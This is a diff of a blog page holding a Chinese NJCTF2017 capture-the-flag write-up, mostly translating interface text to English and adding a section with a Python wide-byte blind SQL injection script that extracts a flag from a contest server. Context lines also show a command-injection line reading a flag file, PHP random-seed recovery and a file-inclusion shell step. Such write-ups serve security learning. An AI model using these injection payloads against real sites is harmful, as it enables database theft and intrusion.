@@ -28,7 +28,7 @@
 <meta property="og:image" content="http://i1.piimg.com/567571/4b90803e9609112f.png">
 <meta property="og:image" content="http://i1.piimg.com/567571/7a56c50170c787ae.png">
 <meta property="og:image" content="http://p1.bqimg.com/567571/e63b285dd2955ad6.png">
-<meta property="og:updated_time" content="2017-03-18T04:34:41.086Z">
+<meta property="og:updated_time" content="2017-03-18T04:44:42.667Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="NJCTF2017">
 <meta name="twitter:description" content="NJCTF题目还是不错的，虽然很多都没做出来，总结总结慢慢积累">
@@ -165,13 +165,13 @@
                 <div class="tips-box hide">
                     <div class="tips-arrow"></div>
                     <ul class="tips-inner">
-                        <li>菜单</li>
-                        <li>标签</li>
+                        <li>Menu</li>
+                        <li>Tags</li>
                         
-                        <li>友情链接</li>
+                        <li>Friends</li>
                         
                         
-                        <li>关于我</li>
+                        <li>About Me</li>
                         
                     </ul>
                 </div>
@@ -281,7 +281,7 @@
             </nav>
         </header>                
     </div>
-    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+    <link class="menu-list" tags="Tags" friends="Friends" about="About Me"/>
 </nav>
       <div class="body-wrap"><article id="post-NJCTF2017" class="article article-type-post" itemscope itemprop="blogPost">
   
@@ -355,6 +355,7 @@ i=echo `cat /var/www/AOvU7WJDRTxn1tv2g56SJLpJK1l7EmBi_thi5_flag`;
 <p>我们通过使session为空，使得生成的md5为纯数字，将md5放到网上查询发现需要付费，那么就自己写一段代码爆破一下：<br><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> hashlib</div><div class="line">c = <span class="string">'90369fd9718fd781f4b61b8cc5a1c991'</span></div><div class="line">i=<span class="number">0</span></div><div class="line"><span class="keyword">while</span> (i&lt;<span class="number">999999999</span>):</div><div class="line">    a = str(i)</div><div class="line">    b = hashlib.md5(a)</div><div class="line">    d = str(b.hexdigest())</div><div class="line">    <span class="keyword">if</span> (d == c):</div><div class="line">        print a</div><div class="line">        print d</div><div class="line">        <span class="keyword">break</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        i=i+1</div></pre></td></tr></table></figure></p>
 <p>跑了二十分钟才跑出来为<code>664794591</code>，看write up说用到这样一个<a href="http://download.openwall.net/pub/projects/php_mt_seed/" target="_blank" rel="external">工具</a>一个c语言写的求seed的工具，刚开始不会用，原来在linux下可以直接gcc编译然后运行:<br><img src="http://p1.bqimg.com/567571/e63b285dd2955ad6.png" alt=""><br>然后直接用加密代码得到文件名<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?php</span></span></div><div class="line">$set = <span class="keyword">array</span>(<span class="string">"a"</span>, <span class="string">"A"</span>, <span class="string">"b"</span>, <span class="string">"B"</span>, <span class="string">"c"</span>, <span class="string">"C"</span>, <span class="string">"d"</span>, <span class="string">"D"</span>, <span class="string">"e"</span>, <span class="string">"E"</span>, <span class="string">"f"</span>, <span class="string">"F"</span>,</div><div class="line">    <span class="string">"g"</span>, <span class="string">"G"</span>, <span class="string">"h"</span>, <span class="string">"H"</span>, <span class="string">"i"</span>, <span class="string">"I"</span>, <span class="string">"j"</span>, <span class="string">"J"</span>, <span class="string">"k"</span>, <span class="string">"K"</span>, <span class="string">"l"</span>, <span class="string">"L"</span>,</div><div class="line">    <span class="string">"m"</span>, <span class="string">"M"</span>, <span class="string">"n"</span>, <span class="string">"N"</span>, <span class="string">"o"</span>, <span class="string">"O"</span>, <span class="string">"p"</span>, <span class="string">"P"</span>, <span class="string">"q"</span>, <span class="string">"Q"</span>, <span class="string">"r"</span>, <span class="string">"R"</span>,</div><div class="line">    <span class="string">"s"</span>, <span class="string">"S"</span>, <span class="string">"t"</span>, <span class="string">"T"</span>, <span class="string">"u"</span>, <span class="string">"U"</span>, <span class="string">"v"</span>, <span class="string">"V"</span>, <span class="string">"w"</span>, <span class="string">"W"</span>, <span class="string">"x"</span>, <span class="string">"X"</span>,</div><div class="line">    <span class="string">"y"</span>, <span class="string">"Y"</span>, <span class="string">"z"</span>, <span class="string">"Z"</span>, <span class="string">"1"</span>, <span class="string">"2"</span>, <span class="string">"3"</span>, <span class="string">"4"</span>, <span class="string">"5"</span>, <span class="string">"6"</span>, <span class="string">"7"</span>, <span class="string">"8"</span>, <span class="string">"9"</span>);</div><div class="line">$seed=<span class="number">451382085</span>;</div><div class="line">mt_srand($seed);</div><div class="line">$ss = mt_rand();</div><div class="line">$str=<span class="string">""</span>;</div><div class="line"><span class="keyword">for</span> ($i = <span class="number">1</span>; $i &lt;= <span class="number">32</span>; ++$i) &#123;</div><div class="line">    $ch = mt_rand(<span class="number">0</span>, count($set) - <span class="number">1</span>);</div><div class="line">    $str .= $set[$ch];</div><div class="line">&#125;</div><div class="line"><span class="keyword">echo</span> $str;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
 <p>利用phar伪协议包含ZIP文件得到shell，由于最开始大意弄成了RAR发现phar只适合ZIP格式。</p>
+<h2 id="Come-on"><a href="#Come-on" class="headerlink" title="Come on"></a>Come on</h2><p>拿到题目只知道是注入，一脸懵逼，看了write up才知道是宽字节布尔盲注过滤了<code>/*、*/、and、or、mid、substr、union、&gt;、&lt;、空白符、ascii</code>等敏感词，使用括号代替空格，使用left/right函数结合以代替substr()和mid()的方式进行注入，且此查询默认不区分大小写，需要使用binary()附上NSIS大佬的脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># encoding: utf-8</span></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</div><div class="line">url = <span class="string">"http://218.2.197.235:23733/index.php?key="</span></div><div class="line">payload = <span class="string">"\xc0'||(select(binary(flag))from(flag))like(0x%s)#"</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(str)</span>:</span></div><div class="line">    u = url + quote(payload%(str.encode(<span class="string">"hex"</span>)))</div><div class="line">    ret = requests.get(u).content</div><div class="line">    <span class="keyword">return</span> <span class="string">'002265'</span> <span class="keyword">in</span> ret</div><div class="line">ans = <span class="string">""</span></div><div class="line">s = <span class="string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"$\'()*+,-./:;&lt;=&gt;?@[\\]^`&#123;|&#125;~\'"_%'</span></div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">    <span class="keyword">print</span> ans</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</div><div class="line">        <span class="keyword">if</span> check(ans + i + <span class="string">'%'</span>):</div><div class="line">            ans += i</div><div class="line">            <span class="keyword">break</span></div></pre></td></tr></table></figure></p>
 <h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="konck"><a href="#konck" class="headerlink" title="konck"></a>konck</h2><figure class="highlight lasso"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="params">...</span>._<span class="params">...</span>.._.._<span class="params">...</span>._<span class="params">...</span>_<span class="params">...</span>.._<span class="params">...</span>._<span class="params">...</span>_<span class="params">...</span>_<span class="params">...</span>._<span class="params">...</span>._<span class="params">...</span><span class="params">...</span>._._<span class="params">...</span>._<span class="params">...</span>.._.._<span class="params">...</span>._<span class="params">...</span>_<span class="params">...</span>_<span class="params">...</span>._<span class="params">...</span>._<span class="params">...</span>_<span class="params">...</span>_<span class="params">...</span>._.._<span class="params">...</span>_<span class="params">...</span><span class="params">...</span>._<span class="params">...</span><span class="params">...</span><span class="params">...</span><span class="params">...</span><span class="params">...</span><span class="params">...</span></div><div class="line">zjqz hexjz mo oqrs sai daiyn lebn zjo vos ltah zjer horrqxo e iron lobdo za voou zjo vos qfqs ltah mqn qrr joto er zjo horrqxo ebooqydrztyqqojolx</div></pre></td></tr></table></figure>
 <p>最开始一直以为上面的是摩斯密码，后来才知道是与下面的一一对照，是一个单表替换加栅栏解密利用<a href="http://quipqiup.com/" target="_blank" rel="external">quipqiup</a>解密得到<code>that might be easy you could find the key from this message i used fence to keep the key away from bad ass here is the message ineealcstrlaaehefg</code>,提示说flag就在后面的字母里面，栅栏一下得到<code>icanseetherealflag</code></p>
 <h2 id="easy-crypto"><a href="#easy-crypto" class="headerlink" title="easy_crypto"></a>easy_crypto</h2><p>就是根据已有的加密代码跟明文与密文爆破出key然后得到key对flag.txt进行解密得到flag。<br>源程序：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span> (argc != <span class="number">3</span>) &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"USAGE: %s input_file output_file\n"</span>, argv[<span class="number">0</span>]);</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">    FILE* input_file  = fopen(argv[<span class="number">1</span>], <span class="string">"rb"</span>);</div><div class="line">    FILE* output_file = fopen(argv[<span class="number">2</span>], <span class="string">"wb"</span>);</div><div class="line">    <span class="keyword">if</span> (!input_file || !output_file) &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Error\n"</span>);</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">char</span> key[] = <span class="string">"XXXXXXXXXXXX"</span>;</div><div class="line">    <span class="keyword">char</span> p, t, c = <span class="number">0</span>;</div><div class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</div><div class="line">    <span class="keyword">while</span> ((p = fgetc(input_file)) != EOF) &#123;</div><div class="line">        c = ((key[i % <span class="built_in">strlen</span>(key)] ^ t) + (p-t) + i*i ) &amp; <span class="number">0xff</span>;</div><div class="line">        t = p;</div><div class="line">        i++;</div><div class="line">        fputc(c, output_file);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
@@ -368,17 +369,17 @@ i=echo `cat /var/www/AOvU7WJDRTxn1tv2g56SJLpJK1l7EmBi_thi5_flag`;
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2017/03/15/NJCTF2017/">NJCTF2017</a></p>
-        <p><span>文章作者:</span><a href="/" title="回到主页">Isron</a></p>
-        <p><span>发布时间:</span>2017-03-15, 10:20:48</p>
-        <p><span>最后更新:</span>2017-03-18, 12:34:41</p>
+        <p><span>Title:</span><a href="/2017/03/15/NJCTF2017/">NJCTF2017</a></p>
+        <p><span>Author:</span><a href="/" title="Back to Homepage">Isron</a></p>
+        <p><span>Created:</span>2017-03-15, 10:20:48</p>
+        <p><span>Updated:</span>2017-03-18, 12:44:42</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2017/03/15/NJCTF2017/" title="NJCTF2017">http://isron.dropsec.xyz/2017/03/15/NJCTF2017/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://isron.dropsec.xyz/2017/03/15/NJCTF2017/　　作者: Isron" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>Full URL:</span><a class="post-url" href="/2017/03/15/NJCTF2017/" title="NJCTF2017">http://isron.dropsec.xyz/2017/03/15/NJCTF2017/</a>
+            <span class="copy-path" data-clipboard-text="From http://isron.dropsec.xyz/2017/03/15/NJCTF2017/　　By Isron" title="Copy Article&#39;s Link &amp; Author"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
-            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+            <span>License:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"CC BY-NC-SA 4.0"</a> Keep Link &amp; Author if Distribute.
         </p>
     </div>
 
@@ -405,9 +406,9 @@ i=echo `cat /var/www/AOvU7WJDRTxn1tv2g56SJLpJK1l7EmBi_thi5_flag`;
 </article>
 
     <div id="toc" class="toc-article">
-        <strong class="toc-title">文章目录</strong>
+        <strong class="toc-title">Contents</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Login"><span class="toc-number">1.1.</span> <span class="toc-text">Login</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Get-Flag"><span class="toc-number">1.2.</span> <span class="toc-text">Get Flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Text-wall"><span class="toc-number">1.3.</span> <span class="toc-text">Text wall</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SHA1加密与MD5"><span class="toc-number">1.3.1.</span> <span class="toc-text">SHA1加密与MD5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#源码泄露"><span class="toc-number">1.3.2.</span> <span class="toc-text">源码泄露</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Wallet"><span class="toc-number">1.4.</span> <span class="toc-text">Wallet</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pictures-wall"><span class="toc-number">1.5.</span> <span class="toc-text">pictures wall</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Guess"><span class="toc-number">1.6.</span> <span class="toc-text">Guess</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MISC"><span class="toc-number">2.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#konck"><span class="toc-number">2.1.</span> <span class="toc-text">konck</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-crypto"><span class="toc-number">2.2.</span> <span class="toc-text">easy_crypto</span></a></li></ol></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Login"><span class="toc-number">1.1.</span> <span class="toc-text">Login</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Get-Flag"><span class="toc-number">1.2.</span> <span class="toc-text">Get Flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Text-wall"><span class="toc-number">1.3.</span> <span class="toc-text">Text wall</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SHA1加密与MD5"><span class="toc-number">1.3.1.</span> <span class="toc-text">SHA1加密与MD5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#源码泄露"><span class="toc-number">1.3.2.</span> <span class="toc-text">源码泄露</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Wallet"><span class="toc-number">1.4.</span> <span class="toc-text">Wallet</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pictures-wall"><span class="toc-number">1.5.</span> <span class="toc-text">pictures wall</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Guess"><span class="toc-number">1.6.</span> <span class="toc-text">Guess</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Come-on"><span class="toc-number">1.7.</span> <span class="toc-text">Come on</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MISC"><span class="toc-number">2.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#konck"><span class="toc-number">2.1.</span> <span class="toc-text">konck</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-crypto"><span class="toc-number">2.2.</span> <span class="toc-text">easy_crypto</span></a></li></ol></li></ol>
         
     </div>
     <style>
@@ -421,10 +422,10 @@ i=echo `cat /var/www/AOvU7WJDRTxn1tv2g56SJLpJK1l7EmBi_thi5_flag`;
         }
     </style>
 
-    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+    <input type="button" id="tocButton" value="Hide"  title="Show or Hide Table of Contents">
 
     <script>
-        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+        yiliaConfig.toc = ["Hide", "Show", !!"false"];
     </script>
 
 
@@ -470,15 +471,15 @@ i=echo `cat /var/www/AOvU7WJDRTxn1tv2g56SJLpJK1l7EmBi_thi5_flag`;
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2017/03/15/Linux下命令分割符的区别/" title="上一篇: Linux 下命令分割符的区别">
+            <a href="/2017/03/15/Linux下命令分割符的区别/" title="Pre: Linux 下命令分割符的区别">
                 <i class="fa fa-angle-left"></i>
             </a>
         
 
-        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        <a title="Mini Archives"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2017/03/13/Jarvis-OJ-api调用/" title="下一篇: Jarvis OJ api调用">
+            <a href="/2017/03/13/Jarvis-OJ-api调用/" title="Next: Jarvis OJ api调用">
                 <i class="fa fa-angle-right"></i>
             </a>
         
@@ -501,14 +502,14 @@ i=echo `cat /var/www/AOvU7WJDRTxn1tv2g56SJLpJK1l7EmBi_thi5_flag`;
                 2016-2017 Isron
             </div>
             <div class="footer-right">
-                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+                <a href="http://hexo.io/" target="_blank" title="A fast, simple &amp; powerful blog framework">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="Another simple and elegant theme for Hexo  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
             </div>
         </div>
         
             <div class="visit">
                 
                     <span id="busuanzi_container_site_pv" style='display:none'>
-                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        <span id="site-visit" title="Site Visitors"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
                         </span>
                     </span>
                 
@@ -517,7 +518,7 @@ i=echo `cat /var/www/AOvU7WJDRTxn1tv2g56SJLpJK1l7EmBi_thi5_flag`;
                 
                 
                     <span id="busuanzi_container_page_pv" style='display:none'>
-                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        <span id="page-visit"  title="Page Hits"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
                         </span>
                     </span>
                 
@@ -550,9 +551,9 @@ i=echo `cat /var/www/AOvU7WJDRTxn1tv2g56SJLpJK1l7EmBi_thi5_flag`;
 
 
 <div class="scroll" id="scroll">
-    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
-    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
-    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+    <a href="#" title="Back to Top"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="Comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="Go to Bottom"><i class="fa fa-arrow-down"></i></a>
 </div>
 <script>
     // Open in New Window
